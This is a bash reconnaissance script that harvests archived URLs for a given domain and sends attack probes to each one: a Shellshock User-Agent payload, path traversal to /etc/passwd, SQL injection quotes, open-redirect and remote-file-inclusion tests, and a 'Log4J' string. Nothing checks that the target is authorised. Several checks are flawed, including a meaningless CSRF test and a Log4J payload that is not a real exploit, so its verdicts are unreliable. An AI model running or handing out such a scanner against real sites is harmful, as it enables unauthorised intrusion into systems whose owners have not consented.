#!/bin/bash
echo "Enter the domain: "
read domain

mkdir $domain

waybackurls $domain | grep -E "\.js$|\.php$|\.yml$|\.env$|\.txt$|\.xml$|\.config$" | httpx -verbose | sort -u | tee urls.txt 

while read url
do

  # Check for RCE vulnerability
  echo "Testing $url for RCE vulnerability..." | lolcat
response=$(curl -s -H 'User-Agent: () { :;}; echo vulnerable' "$url")
if [[ $response == *"vulnerable"* ]]; then
  echo "$url is RCE vulnerable" >> "$domain/$domain.txt"
else
  echo "$url is not RCE vulnerable"
fi
 
echo "Testing $url for CSRF vulnerability..." | lolcat
response=$(curl -s -X POST -d 'token=test' "$url")
if [[ $response == *"token=test"* ]]; then
  echo "$url is CSRF vulnerable" >> "$domain/$domain.txt"
else
  echo "$url is not CSRF vulnerable"
fi


  # Check for LFI vulnerability
echo "Testing $url for LFI vulnerability..." | lolcat
response=$(curl -s "$url/../../../../../../../../../../../../etc/passwd")
if [[ $response == *"root:"* ]]; then
  echo "$url is LFI vulnerable" >> "$domain/$domain.txt"
else
  echo "$url is not LFI vulnerable"
fi

  echo "Testing $url for open redirect vulnerability..." | lolcat
  # Check for open redirect vulnerability
  response=$(curl -s -L "$url?redirect=http://google.com")
  if [[ $response == *"<title>Google</title>"* ]]; then
    echo "$url is open redirect vulnerable" >> "$domain/$domain.txt"
  else
    echo "$url is not open redirect vulnerable"
  fi
  echo "Testing $url for Log4J vulnerability..." | lolcat
  # Check for Log4J vulnerability
  response=$(curl -s "$url/%20%20%20%20%20%20%20%20@org.apache.log4j.BasicConfigurator@configure()")
  if [[ $response == *"log4j"* ]]; then
    echo "$url is Log4J vulnerable" >> "$domain/$domain.txt"
  else
    echo "$url is not Log4J vulnerable"
  fi
  echo "Testing $url for RFI vulnerability..." | lolcat
  # Check for RFI vulnerability
  response=$(curl -s "$url?file=http://google.com")
  if [[ $response == *"<title>Google</title>"* ]]; then
    echo "$url is RFI vulnerable" >> "$domain/$domain.txt"
  else
    echo "$url is not RFI vulnerable"
  fi
 # Check for directory traversal vulnerability
  echo "Testing $url for path/directory traversal vulnerability..." | lolcat
response=$(curl -s "$url/../../../../../../../../../../../../etc/passwd")
if [[ $response == *"root:"* ]]; then
  echo "$url is path traversal vulnerable" >> "$domain/$domain.txt"
else
  echo "$url is not path traversal vulnerable"
fi
# Check for SQL injection vulnerability
echo "Testing $url for SQL injection vulnerability..." | lolcat
response=$(curl -s "$url/index.php?id=1'")
if [[ $response == *"SQL syntax"* ]]; then
  echo "$url is SQL injection vulnerable" >> "$domain/$domain.txt"
else
  echo "$url is not SQL injection vulnerable"
fi
done < urls.txt
mv urls.txt $domain
